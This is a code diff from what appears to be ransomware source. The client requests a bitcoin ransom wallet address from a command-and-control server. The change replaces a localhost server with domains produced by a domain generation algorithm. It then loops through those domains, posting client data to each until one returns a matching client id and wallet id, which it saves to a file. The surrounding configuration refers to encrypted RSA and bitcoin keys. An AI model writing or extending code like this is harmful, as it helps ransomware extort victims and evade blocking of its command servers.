@@ -4,6 +4,7 @@ from core.utils.generators import generate_client_id
 from core.utils.statistics import get_statistics
 from core.utils.file_ops import write_data_to_file
 from base64 import b64encode, b64decode
+from core.comms.cnc_generator import generate_domains
 from core.config import (
     ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     ENCRYPTED_BITCOIN_KEY_LOCATION,
@@ -38,8 +39,12 @@ def send_request(server, body):
         dict: The response parameters
     """    
     logger.info(f"Sending request to {server}")
-    response = requests.post(url=f"{server}/initialise", json=body).json()
-    return response
+    try:
+        response = requests.post(url=f"http://{server.strip('/')}/initialise", json=body).json()
+        print(response)
+        return response
+    except Exception as err:
+        logger.error(err)
 
 
 def get_bitcoin_wallet_address():
@@ -49,11 +54,15 @@ def get_bitcoin_wallet_address():
         str: The wallet Id that the user needs to make payments to
     """    
     body = build_request()
-    response = send_request(server="http://localhost:5000", body=body)
-    client_id = response.get("client_id")
-    wallet_id = response.get("wallet_id")
-    if generate_client_id() == client_id:
-        logger.info("Wallet ID successfully received")
-        write_data_to_file(BITCOIN_WALLET_ID_PATH, wallet_id.encode())
-        return response.get("wallet_id")
+    domains = generate_domains()
+    for domain in domains:
+        response = send_request(server=domain, body=body)
+        if response:
+            client_id = response.get("client_id")
+            wallet_id = response.get("wallet_id")
+            print(client_id, wallet_id)
+            if generate_client_id() == client_id:
+                logger.info("Wallet ID successfully received")
+                write_data_to_file(BITCOIN_WALLET_ID_PATH, wallet_id.encode())
+                return response.get("wallet_id")
 
